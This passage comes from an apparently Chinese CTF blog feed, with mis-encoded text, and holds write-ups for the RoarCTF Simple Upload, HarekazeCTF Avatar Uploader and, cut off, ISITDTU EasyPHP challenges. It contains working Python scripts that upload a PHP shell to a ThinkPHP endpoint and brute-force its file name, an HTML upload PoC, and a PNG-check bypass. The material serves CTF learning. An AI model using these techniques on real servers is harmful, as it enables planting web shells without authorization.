class="token property">savePath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span>          <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savepath'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url"</span><span class="token operator">=></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"success"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>thinkphpçš„ä¸Šä¼ ï¼Œé»˜è®¤ä¸Šä¼ åœ°å€ä¸º<code>/home/index/upload</code>,è¿™çœŸæƒ³ä¸åˆ°</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ce34bf36-7954-4ba3-b71b-971bc4084686.node4.buuoj.cn:81&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816190128299.png"></p><p>ä¸Šä¼ æˆåŠŸåä¼šç»™å‡ºè·¯å¾„</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816193301468.png"></p><h3 id="thinkphpä¸Šä¼ æ¼æ´"><a href="#thinkphpä¸Šä¼ æ¼æ´" class="headerlink" title="thinkphpä¸Šä¼ æ¼æ´"></a>thinkphpä¸Šä¼ æ¼æ´</h3><p>ThinkPHPé‡Œçš„<code>upload()</code>å‡½æ•°åœ¨ä¸ä¼ å‚çš„æƒ…å†µä¸‹æ˜¯æ‰¹é‡ä¸Šä¼ çš„ï¼Œæ•´ä¸ª<code>$_FILES</code>æ•°ç»„çš„æ–‡ä»¶éƒ½ä¼šä¸Šä¼ ä¿å­˜ï¼Œè¿™é‡Œå¯ä»¥ç†è§£ä¸ºé˜²æŠ¤æœºåˆ¶åªä¼šæ£€æµ‹ä¸€æ¬¡ï¼Œè¿ç”¨æ¡ä»¶ç«äº‰ï¼Œå¤šæ¬¡ä¸Šä¼ ä¾¿å¯ä»¥ç»•è¿‡æ–‡ä»¶åç¼€çš„æ£€æµ‹</p><p>è€Œä¸”ï¼Œthinkphpå¯¹äºæ–‡ä»¶å‘½åæ˜¯ç”¨<code>uniqid()</code>å‡½æ•°ï¼Œè¿™æ˜¯åŸºäºæ¯«ç§’çº§çš„å½“å‰æ—¶é—´ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€å¿«ç‚¹å°±å˜ä¸¤ä½ï¼Œä¸€èˆ¬æ¥è¯´å°±å˜ä¸‰ä½ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816193800088.png"></p><p>å¯è§ï¼Œæˆ‘åªè¦ä¸Šä¼ å›¾ç‰‡1ï¼Œshellï¼Œå›¾ç‰‡2ï¼Œç„¶åå°±èƒ½çˆ†ç ´å‡ºshellæ–‡ä»¶çš„æ–‡ä»¶åã€‚</p><p>å› ä¸ºæ˜¯16è¿›åˆ¶ï¼Œæ‰€ä»¥éœ€è¦å­—ç¬¦åªæœ‰</p><pre class="line-numbers language-none"><code class="language-none">0123456789abcdef<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://0023f6ee-d192-4ad9-8864-87af34a495f6.node4.buuoj.cn:81/index.php/home/index/upload'</span>file1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment"># upload()ä¸ä¼ å‚æ—¶å³æ˜¯æ‰¹é‡ä¸Šä¼ æ‰€ä»¥ç”¨[]</span>file2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file[]'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-08-16\&#x2F;611a6459b7a3b.txt&quot;,&quot;success&quot;:1&#125;&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-08-16\&#x2F;611a6459dd848.txt&quot;,&quot;success&quot;:1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·ä¸Šä¼ è¿˜æŒºæ…¢çš„ï¼Œéœ€è¦çˆ†ç ´5ä½ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">'http://0023f6ee-d192-4ad9-8864-87af34a495f6.node4.buuoj.cn:81/'</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> o <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                    url <span class="token operator">=</span> target<span class="token operator">+</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>o<span class="token operator">+</span>p<span class="token operator">+</span><span class="token string">".php"</span>                    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>                    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width, initial-scale=1.0"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">POST</span>æ•°æ®åŒ…<span class="token constant">POC</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"http://ce34bf36-7954-4ba3-b71b-971bc4084686.node4.buuoj.cn:81/index.php/home/index/upload"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"hidden"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"123"</span> <span class="token operator">/</span><span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file2"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816202350971.png"></p><pre class="line-numbers language-none"><code class="language-none">\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-08-16\&#x2F;611a58b82a4b0.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816211600446.png"></p><p>è¯•äº†ä¸¤å›ï¼Œç»ˆäºè·‘åˆ°äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816214902005.png"></p><p>æ‰“å¼€ä¸€çœ‹ï¼Œç›´æ¥ç»™äº†flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816214918891.png"></p><h2 id="ä¸è§£ä¹‹å¤„"><a href="#ä¸è§£ä¹‹å¤„" class="headerlink" title="ä¸è§£ä¹‹å¤„"></a>ä¸è§£ä¹‹å¤„</h2><p>è¿·æƒ‘çš„æ˜¯ï¼Œå¦‚æœæ˜¯ä¸Šä¼ txtï¼Œæ•°æ®åŒ…å¯ä»¥éšä¾¿æ”¹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816210750651.png"></p><p>ä½†æ¢æˆå›¾ç‰‡ï¼Œå“ªæ€•æ˜¯æŠŠä¸‹é¢çš„file1æ”¹ä¸ºfile2ï¼Œéƒ½ä¸ä¼šè¿”å›è·¯å¾„</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816210821710.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816210906217.png"></p><p>ä¸”<code>Content-Length: 3568</code>ä¸€ä¸‹å˜æˆ<code>Content-Length: 4809</code></p><p>æ„Ÿè§‰å°±åƒæ˜¯é‡æ–°ç¼–ç äº†ä¸€æ ·ï¼Œç„¶åå¯¼è‡´ä¸Šä¼ é”™è¯¯</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816211012651.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Simple-Upload/image-20210816211037845.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[HarekazeCTF2019]Avatar Uploader</title>
      <link href="/p/2917397323.html"/>
      <url>/p/2917397323.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816141134001.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ä¸Šä¼ é™åˆ¶pngï¼Œè¿˜ä¼šæ£€æµ‹å°ºå¯¸ï¼Œå‘åŒ…çœ‹ä¸åˆ°åé¦ˆï¼ŒæŒºçƒ¦çš„</p><p>åŸæ¥é¢˜ç›®è¿˜ç»™äº†æºç ï¼Œ</p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check whether file is uploaded</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file size</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file type</span><span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// check file width/height</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// I hope this never happens...</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ok</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">flash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h3><p>åœ¨è¿™æ‹¿flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816143639267.png"></p><p>é‡ç‚¹æ˜¯ç»•è¿‡è¿™é‡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165109112.png"></p><blockquote><p><code>finfo_file()</code>ä¸»è¦æ˜¯è¯†åˆ«<strong>PNG</strong>æ–‡ä»¶åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œä¿¡æ¯ï¼Œè‹¥ä¿ç•™æ–‡ä»¶å¤´ä¿¡æ¯ï¼Œç ´åæ‰æ–‡ä»¶é•¿å®½ç­‰å…¶ä½™ä¿¡æ¯ï¼Œä¹Ÿå°±å¯ä»¥ç»•è¿‡<code>getimagesize()</code>å‡½æ•°çš„æ£€éªŒ</p></blockquote><p>éšä¾¿æ‰¾ä¸ªå›¾ç‰‡ï¼Œåˆ æ‰å¤šä½™çš„ä¸œè¥¿</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165632093.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165924125.png"></p><p>ä¸Šä¼ ä¸€ä¸‹ï¼Œç»“æŸã€‚</p><p>æµ‹è¯•äº†ä¸‹ï¼Œå°±ç¬¬ä¸€è¡Œï¼Œä¸€ä¸ªå­—ç¬¦éƒ½ä¸èƒ½å¤šï¼Œå¤šäº†å°±ä¼šå˜æˆ<code>octet-stream</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816173818763.png"></p><p>å¼„æœ¬åœ°ç¯å¢ƒçš„æ—¶å€™ï¼Œè°·æ­Œæµè§ˆå™¨ä¸çŸ¥é“æŠ½ä»€ä¹ˆé£ï¼Œæ˜æ˜è®¾ç½®å¥½äº†hostsï¼Œä¸€ä¼šå¯ä»¥ï¼Œä¸€ä¼šæœ‰è·³è½¬åˆ°è«åå…¶å¦™çš„ç½‘ç«™ï¼Œéšå£°æ¨¡å¼æœ‰æ²¡é—®é¢˜ï¼Œç«ç‹ï¼Œphpstormï¼Œedgeä¹Ÿå¯ä»¥ã€‚æ¢äº†ä¸ªç½‘å€ï¼Œå¾—ï¼Œå¼€å§‹éšç§é”™è¯¯ï¼Œè¶Šæ¥è¶Šæƒ³æ”¾å¼ƒchromeäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ISITDTU 2019]EasyPHP</title>
      <link href="/p/2441275844.html"/>
      <url>/p/2441275844.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rosÃ© will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token 